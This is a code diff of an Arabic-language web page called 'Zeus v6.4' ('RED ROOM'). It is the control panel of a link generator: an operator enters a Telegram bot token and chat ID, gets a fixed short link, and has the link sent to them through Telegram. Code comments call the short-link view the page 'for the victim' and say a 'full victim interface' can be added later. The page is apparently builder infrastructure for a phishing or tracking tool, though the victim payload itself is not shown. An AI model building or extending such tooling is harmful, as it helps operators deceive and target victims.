@@ -3,257 +3,49 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>𝒁𝒆𝒖𝒔 · v6.3 (رابط دائم)</title>
+  <title>𝒁𝒆𝒖𝒔 · v6.4 (رابط ثابت)</title>
   <style>
-    body {
-      background: #0a0202;
-      color: #f0e6e6;
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      min-height: 100vh;
-      margin: 0;
-      padding: 20px;
-      direction: rtl;
-    }
-    .container {
-      background: #160404;
-      border: 1px solid #ff003388;
-      border-radius: 16px;
-      padding: 30px 25px;
-      max-width: 550px;
-      width: 100%;
-      box-shadow: 0 0 50px rgba(255,0,51,0.15);
-    }
-    h1 {
-      font-size: 26px;
-      color: #ff0033;
-      text-align: center;
-      margin: 0 0 5px 0;
-      letter-spacing: 2px;
-    }
-    .sub {
-      text-align: center;
-      color: #f0e6e688;
-      font-size: 13px;
-      margin-bottom: 20px;
-      border-bottom: 1px solid #ff003322;
-      padding-bottom: 10px;
-    }
-    .field {
-      margin-bottom: 18px;
-    }
-    .field label {
-      display: block;
-      font-size: 13px;
-      color: #ff0033aa;
-      margin-bottom: 5px;
-      letter-spacing: 0.5px;
-    }
-    .field input {
-      width: 100%;
-      padding: 10px 12px;
-      border-radius: 8px;
-      border: 1px solid #ff003355;
-      background: #0d0202;
-      color: #f0e6e6;
-      font-size: 14px;
-      box-sizing: border-box;
-      direction: ltr;
-      text-align: left;
-    }
-    .field input::placeholder {
-      color: #f0e6e644;
-    }
-    .permalink-row {
-      display: flex;
-      gap: 8px;
-      margin: 6px 0 12px;
-    }
-    .permalink-row input {
-      flex: 1;
-      padding: 6px 10px;
-      background: #0a0101;
-      border: 1px solid #ff003344;
-      border-radius: 6px;
-      color: #f0e6e688;
-      font-size: 12px;
-      direction: ltr;
-      text-align: left;
-    }
-    .permalink-row button {
-      background: #1a0808;
-      border: 1px solid #ff003366;
-      color: #f0e6e6;
-      padding: 6px 14px;
-      border-radius: 6px;
-      cursor: pointer;
-      font-size: 13px;
-      white-space: nowrap;
-    }
-    .permalink-row button:hover {
-      background: #2a0808;
-      border-color: #ff0033;
-    }
-    .features {
-      display: grid;
-      grid-template-columns: 1fr 1fr 1fr;
-      gap: 8px;
-      margin: 12px 0 18px;
-    }
-    .feature-item {
-      background: #1a0808;
-      border: 1px solid #ff003333;
-      border-radius: 8px;
-      padding: 8px 4px;
-      text-align: center;
-      cursor: pointer;
-      transition: 0.2s;
-      font-size: 13px;
-      color: #f0e6e688;
-    }
-    .feature-item.active {
-      border-color: #ff0033;
-      background: #2a0808;
-      color: #ff0033;
-      box-shadow: 0 0 20px #ff003322;
-    }
-    .feature-item input {
-      display: none;
-    }
-    .btn {
-      width: 100%;
-      padding: 14px;
-      border: none;
-      border-radius: 10px;
-      background: linear-gradient(145deg, #2a0000, #0d0000);
-      color: #f0e6e6;
-      font-size: 18px;
-      font-weight: bold;
-      letter-spacing: 2px;
-      border: 1px solid #ff003388;
-      cursor: pointer;
-      transition: 0.15s;
-      box-shadow: 0 6px 0 #4a0000, 0 8px 25px #00000099;
-    }
-    .btn:hover:not(:disabled) {
-      transform: translateY(-2px);
-      box-shadow: 0 4px 0 #5a0000, 0 12px 35px #000000cc;
-    }
-    .btn:active:not(:disabled) {
-      transform: translateY(4px);
-      box-shadow: 0 2px 0 #3a0000;
-    }
-    .btn:disabled {
-      opacity: 0.5;
-      transform: translateY(2px);
-      box-shadow: 0 3px 0 #3a0000;
-      cursor: not-allowed;
-    }
-    .result {
-      margin-top: 20px;
-      padding: 16px;
-      border: 1px solid #ff003366;
-      border-radius: 10px;
-      background: #0d0202;
-      display: none;
-      text-align: center;
-    }
-    .result .short {
-      font-size: 22px;
-      font-weight: bold;
-      color: #ff0033;
-      letter-spacing: 3px;
-      word-break: break-all;
-      margin: 6px 0;
-    }
-    .result .link {
-      color: #f0e6e6cc;
-      font-size: 14px;
-      word-break: break-all;
-      background: #00000044;
-      padding: 8px;
-      border-radius: 6px;
-      margin: 8px 0;
-    }
-    .result .actions {
-      display: flex;
-      gap: 10px;
-      justify-content: center;
-      margin-top: 10px;
-    }
-    .result .actions button {
-      background: #1a0808;
-      border: 1px solid #ff003366;
-      color: #f0e6e6;
-      padding: 6px 16px;
-      border-radius: 6px;
-      cursor: pointer;
-      font-size: 13px;
-      transition: 0.15s;
-    }
-    .result .actions button:hover {
-      background: #2a0808;
-      border-color: #ff0033;
-    }
-    .log {
-      margin-top: 16px;
-      padding: 10px 14px;
-      border: 1px solid #ff003322;
-      border-radius: 8px;
-      background: #0a0202;
-      font-family: monospace;
-      font-size: 13px;
-      color: #f0e6e688;
-      min-height: 50px;
-      direction: ltr;
-      text-align: left;
-    }
+    /* نفس الأنماط السابقة، يمكنك استخدامها كما هي */
+    body { background: #0a0202; color: #f0e6e6; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; direction: rtl; }
+    .container { background: #160404; border: 1px solid #ff003388; border-radius: 16px; padding: 30px 25px; max-width: 550px; width: 100%; box-shadow: 0 0 50px rgba(255,0,51,0.15); }
+    h1 { font-size: 26px; color: #ff0033; text-align: center; margin: 0 0 5px 0; letter-spacing: 2px; }
+    .sub { text-align: center; color: #f0e6e688; font-size: 13px; margin-bottom: 20px; border-bottom: 1px solid #ff003322; padding-bottom: 10px; }
+    .field { margin-bottom: 18px; }
+    .field label { display: block; font-size: 13px; color: #ff0033aa; margin-bottom: 5px; letter-spacing: 0.5px; }
+    .field input { width: 100%; padding: 10px 12px; border-radius: 8px; border: 1px solid #ff003355; background: #0d0202; color: #f0e6e6; font-size: 14px; box-sizing: border-box; direction: ltr; text-align: left; }
+    .field input::placeholder { color: #f0e6e644; }
+    .permalink-row { display: flex; gap: 8px; margin: 6px 0 12px; }
+    .permalink-row input { flex: 1; padding: 6px 10px; background: #0a0101; border: 1px solid #ff003344; border-radius: 6px; color: #f0e6e688; font-size: 12px; direction: ltr; text-align: left; }
+    .permalink-row button { background: #1a0808; border: 1px solid #ff003366; color: #f0e6e6; padding: 6px 14px; border-radius: 6px; cursor: pointer; font-size: 13px; white-space: nowrap; }
+    .permalink-row button:hover { background: #2a0808; border-color: #ff0033; }
+    .features { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 8px; margin: 12px 0 18px; }
+    .feature-item { background: #1a0808; border: 1px solid #ff003333; border-radius: 8px; padding: 8px 4px; text-align: center; cursor: pointer; transition: 0.2s; font-size: 13px; color: #f0e6e688; }
+    .feature-item.active { border-color: #ff0033; background: #2a0808; color: #ff0033; box-shadow: 0 0 20px #ff003322; }
+    .feature-item input { display: none; }
+    .btn { width: 100%; padding: 14px; border: none; border-radius: 10px; background: linear-gradient(145deg, #2a0000, #0d0000); color: #f0e6e6; font-size: 18px; font-weight: bold; letter-spacing: 2px; border: 1px solid #ff003388; cursor: pointer; transition: 0.15s; box-shadow: 0 6px 0 #4a0000, 0 8px 25px #00000099; }
+    .btn:hover:not(:disabled) { transform: translateY(-2px); box-shadow: 0 4px 0 #5a0000, 0 12px 35px #000000cc; }
+    .btn:active:not(:disabled) { transform: translateY(4px); box-shadow: 0 2px 0 #3a0000; }
+    .btn:disabled { opacity: 0.5; transform: translateY(2px); box-shadow: 0 3px 0 #3a0000; cursor: not-allowed; }
+    .result { margin-top: 20px; padding: 16px; border: 1px solid #ff003366; border-radius: 10px; background: #0d0202; display: none; text-align: center; }
+    .result .short { font-size: 22px; font-weight: bold; color: #ff0033; letter-spacing: 3px; word-break: break-all; margin: 6px 0; }
+    .result .link { color: #f0e6e6cc; font-size: 14px; word-break: break-all; background: #00000044; padding: 8px; border-radius: 6px; margin: 8px 0; }
+    .result .actions { display: flex; gap: 10px; justify-content: center; margin-top: 10px; }
+    .result .actions button { background: #1a0808; border: 1px solid #ff003366; color: #f0e6e6; padding: 6px 16px; border-radius: 6px; cursor: pointer; font-size: 13px; transition: 0.15s; }
+    .result .actions button:hover { background: #2a0808; border-color: #ff0033; }
+    .log { margin-top: 16px; padding: 10px 14px; border: 1px solid #ff003322; border-radius: 8px; background: #0a0202; font-family: monospace; font-size: 13px; color: #f0e6e688; min-height: 50px; direction: ltr; text-align: left; }
     .log .prompt { color: #ff0033; }
-    .error {
-      color: #ff6633;
-      font-size: 13px;
-      margin-top: 6px;
-    }
-    #botList {
-      margin-top: 12px;
-      border-top: 1px solid #ff003322;
-      padding-top: 12px;
-    }
-    #botList .item {
-      display: flex;
-      justify-content: space-between;
-      padding: 4px 0;
-      border-bottom: 1px solid #ff003311;
-      font-size: 13px;
-      direction: ltr;
-    }
-    #botList .item .del {
-      color: #ff003388;
-      cursor: pointer;
-    }
+    .error { color: #ff6633; font-size: 13px; margin-top: 6px; }
+    #botList { margin-top: 12px; border-top: 1px solid #ff003322; padding-top: 12px; }
+    #botList .item { display: flex; justify-content: space-between; padding: 4px 0; border-bottom: 1px solid #ff003311; font-size: 13px; direction: ltr; }
+    #botList .item .del { color: #ff003388; cursor: pointer; }
     #botList .item .del:hover { color: #ff0033; }
-    .footer {
-      margin-top: 16px;
-      text-align: center;
-      font-size: 12px;
-      color: #f0e6e644;
-      letter-spacing: 1px;
-    }
-    .badge-url {
-      background: #ff003322;
-      padding: 2px 8px;
-      border-radius: 12px;
-      font-size: 11px;
-      color: #ff0033;
-    }
+    .footer { margin-top: 16px; text-align: center; font-size: 12px; color: #f0e6e644; letter-spacing: 1px; }
   </style>
 </head>
 <body>
 <div class="container">
-  <h1>𝒁𝒆𝒖𝒔 · v6.3</h1>
-  <div class="sub">‹ رابط دائم · يعمل في أي متصفح ›</div>
+  <h1>𝒁𝒆𝒖𝒔 · v6.4</h1>
+  <div class="sub">‹ رابط قصير ثابت لكل توكن ›</div>
 
   <form id="form">
     <div class="field">
@@ -265,7 +57,6 @@
       <input type="text" id="chatId" placeholder="مثل 123456789" required>
     </div>
 
-    <!-- رابط الإعدادات الدائم (الجذر الحقيقي) -->
     <div class="permalink-row">
       <input type="text" id="permalinkInput" value="" readonly placeholder="احفظ هذا الرابط في أي متصفح" dir="ltr">
       <button type="button" id="copyPermalinkBtn">📋 نسخ الرابط الدائم</button>
@@ -304,17 +95,14 @@
     <div id="listItems"></div>
   </div>
 
-  <div class="footer">◆ XX_8K · RED ROOM v6.3 (حل جذري) ◆</div>
+  <div class="footer">◆ XX_8K · RED ROOM v6.4 (حل ثابت) ◆</div>
 </div>
 
 <script>
   // ================================================================
-  //  𝒁𝒆𝒖𝒔 v6.3 — الحل الجذري لمشكلة اختفاء التوكن عند تغيير المتصفح
-  //  المبدأ: قراءة التوكن ومعرف المحادثة من معلمات الرابط (URL)
-  //  ثم حفظهما في localStorage كخيار احتياطي.
+  //  𝒁𝒆𝒖𝒔 v6.4 — رابط قصير ثابت يعتمد على التوكن (بدون عشوائية)
   // ================================================================
 
-  // --- العناصر ---
   const form = document.getElementById('form');
   const botTokenInput = document.getElementById('botToken');
   const chatIdInput = document.getElementById('chatId');
@@ -330,16 +118,24 @@
   const permalinkInput = document.getElementById('permalinkInput');
   const copyPermalinkBtn = document.getElementById('copyPermalinkBtn');
 
-  // --- قراءة معلمات الرابط (الحل الجذري) ---
-  function getParams() {
-    const params = new URLSearchParams(window.location.search);
-    return {
-      bot: params.get('bot') || '',
-      chat: params.get('chat') || ''
-    };
+  // --- دالة توليد الرابط القصير من التوكن (ثابت) ---
+  function generateShortFromToken(botToken) {
+    let hash = 0;
+    for (let i = 0; i < botToken.length; i++) {
+      hash = ((hash << 5) - hash) + botToken.charCodeAt(i);
+      hash = hash & hash;
+    }
+    let result = Math.abs(hash).toString(36).toUpperCase();
+    while (result.length < 6) result = '0' + result;
+    return result.slice(0, 6);
   }
 
-  // --- تحديث حقل الرابط الدائم ---
+  // --- باقي الدوال (تخزين، عرض، إرسال...) كما هي ---
+  function getParams() {
+    const params = new URLSearchParams(window.location.search);
+    return { bot: params.get('bot') || '', chat: params.get('chat') || '' };
+  }
+
   function updatePermalink() {
     const bot = botTokenInput.value.trim();
     const chat = chatIdInput.value.trim();
@@ -351,7 +147,6 @@
     }
   }
 
-  // --- نسخ الرابط الدائم ---
   copyPermalinkBtn.addEventListener('click', function() {
     const text = permalinkInput.value;
     if (!text || text.includes('أدخل')) {
@@ -378,7 +173,6 @@
     setTimeout(() => copyPermalinkBtn.textContent = '📋 نسخ الرابط الدائم', 1500);
   }
 
-  // --- تفعيل الميزات بالنقر ---
   document.querySelectorAll('.feature-item').forEach(item => {
     item.addEventListener('click', function(e) {
       const cb = this.querySelector('input[type="checkbox"]');
@@ -390,7 +184,6 @@
     });
   });
 
-  // --- السجل والخطأ ---
   function logMessage(msg) {
     const time = new Date().toLocaleTimeString();
     logDiv.innerHTML = `<div><span class="prompt">$</span> ${msg} <span style="color:#666;">[${time}]</span></div>` + logDiv.innerHTML;
@@ -401,7 +194,6 @@
     if (msg) setTimeout(() => errorDiv.textContent = '', 6000);
   }
 
-  // --- دوال التخزين ---
   function getStorage() {
     try { return JSON.parse(localStorage.getItem('zeus_bots') || '{}'); } catch { return {}; }
   }
@@ -409,15 +201,6 @@
     localStorage.setItem('zeus_bots', JSON.stringify(data));
   }
 
-  // --- توليد رمز عشوائي ---
-  function generateShort() {
-    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
-    let token = '';
-    for (let i = 0; i < 6; i++) token += chars[Math.floor(Math.random() * chars.length)];
-    return token;
-  }
-
-  // --- عرض قائمة الروابط ---
   function renderList() {
     const data = getStorage();
     const keys = Object.keys(data);
@@ -447,7 +230,6 @@
     });
   }
 
-  // --- عرض النتيجة ---
   function showResult(shortToken) {
     const base = window.location.origin + window.location.pathname;
     const link = `${base}?t=${shortToken}`;
@@ -457,7 +239,6 @@
     resultBox.scrollIntoView({ behavior: 'smooth', block: 'center' });
   }
 
-  // --- نسخ الرابط القصير ---
   copyBtn.addEventListener('click', function() {
     const text = fullLinkDisplay.textContent;
     if (navigator.clipboard) {
@@ -479,7 +260,6 @@
   }
   openBtn.addEventListener('click', () => window.open(fullLinkDisplay.textContent, '_blank'));
 
-  // --- إرسال الرابط للمستخدم ---
   async function sendLinkToUser(botToken, chatId, shortToken) {
     const base = window.location.origin + window.location.pathname;
     const link = `${base}?t=${shortToken}`;
@@ -504,7 +284,7 @@
     }
   }
 
-  // --- معالج النموذج ---
+  // --- معالج النموذج (التعديل الأساسي هنا) ---
   form.addEventListener('submit', async function(e) {
     e.preventDefault();
     setError('');
@@ -527,30 +307,29 @@
 
       const data = getStorage();
 
+      // توليد الرابط القصير من التوكن (ثابت)
+      const shortToken = generateShortFromToken(botToken);
+
+      // نتحقق مما إذا كان التوكن موجودًا مسبقًا في التخزين
       if (data[botToken]) {
+        // تحديث الميزات إذا تغيرت
         const existing = data[botToken];
-        if (existing.features !== features) {
+        if (existing.features !== features || existing.chatId !== chatId) {
           existing.features = features;
+          existing.chatId = chatId;
           existing.updated = Date.now();
           saveStorage(data);
-          logMessage('🔄 تحديث ميزات الرابط السابق');
+          logMessage('🔄 تحديث بيانات الرابط السابق');
         }
-        showResult(existing.shortToken);
-        await sendLinkToUser(botToken, chatId, existing.shortToken);
+        showResult(shortToken);
+        await sendLinkToUser(botToken, chatId, shortToken);
         renderList();
         generateBtn.disabled = false;
         generateBtn.textContent = '⚡ توليد الرابط';
         return;
       }
 
-      let shortToken;
-      let attempts = 0;
-      const existingTokens = Object.values(data).map(e => e.shortToken);
-      do {
-        shortToken = generateShort();
-        attempts++;
-      } while (existingTokens.includes(shortToken) && attempts < 50);
-
+      // إذا كان التوكن جديدًا، نخزنه
       data[botToken] = {
         chatId: chatId,
         features: features,
@@ -564,8 +343,6 @@
       showResult(shortToken);
       await sendLinkToUser(botToken, chatId, shortToken);
       renderList();
-
-      // تحديث الرابط الدائم بعد التوليد (للتأكد)
       updatePermalink();
 
     } catch (err) {
@@ -577,24 +354,18 @@
     }
   });
 
-  // ================================================================
-  //  🚀  التهيئة — قراءة المعلمات من الرابط (الحل الجذري)
-  // ================================================================
+  // --- التهيئة ---
   (function init() {
-    // 1. قراءة المعلمات من URL
     const params = getParams();
     let bot = params.bot;
     let chat = params.chat;
 
-    // 2. إذا كانت المعلمات موجودة، املأ الحقول بها واحفظها في localStorage
     if (bot && chat) {
       botTokenInput.value = bot;
       chatIdInput.value = chat;
-      // حفظها في localStorage لاستخدامها لاحقاً في نفس المتصفح
       localStorage.setItem('zeus_last_input', JSON.stringify({ botToken: bot, chatId: chat }));
       logMessage(`✅ تم تحميل الإعدادات من الرابط: التوكن ${bot.substring(0,6)}...`);
     } else {
-      // 3. إذا لم تكن موجودة، حاول استرجاعها من localStorage
       try {
         const last = JSON.parse(localStorage.getItem('zeus_last_input') || '{}');
         if (last.botToken) botTokenInput.value = last.botToken;
@@ -603,7 +374,6 @@
       } catch {}
     }
 
-    // 4. تحديث حقل الرابط الدائم عند تغيير الحقول
     botTokenInput.addEventListener('input', () => { updatePermalink();
       saveLastInput(); });
     chatIdInput.addEventListener('input', () => { updatePermalink();
@@ -616,23 +386,21 @@
       }));
     }
 
-    // 5. تهيئة القائمة والسجل
     renderList();
-    logMessage('𝒁𝒆𝒖𝒔 v6.3 جاهز — الرابط الدائم يحل مشكلة المتصفحات');
+    logMessage('𝒁𝒆𝒖𝒔 v6.4 جاهز — الرابط القصير ثابت لكل توكن');
     updatePermalink();
 
-    // 6. إذا كان هناك رابط قصير في URL (للضحية)، نعرض رسالة
     const tParam = new URLSearchParams(window.location.search).get('t');
     if (tParam) {
       document.querySelector('.container').innerHTML = `
         <h1>🔐 رابط صالح</h1>
         <p style="color:#f0e6e6cc;">تم فتح الرابط القصير: <strong style="color:#ff0033;">${tParam}</strong></p>
-        <p style="color:#888;font-size:14px;">هذه النسخة المبسطة تعرض الرابط فقط. يمكنك إضافة واجهة الضحية الكاملة لاحقاً.</p>
+        <p style="color:#888;font-size:14px;">هذه النسخة تعرض الرابط فقط. يمكنك إضافة واجهة الضحية الكاملة لاحقاً.</p>
         <p style="margin-top:20px;"><a href="${window.location.pathname}" style="color:#ff0033;">↩ العودة إلى لوحة التحكم</a></p>
       `;
     }
 
-    console.log('✅ 𝒁𝒆𝒖𝒔 v6.3 (حل جذري) جاهز');
+    console.log('✅ 𝒁𝒆𝒖𝒔 v6.4 (رابط ثابت) جاهز');
   })();
 </script>
 </body>
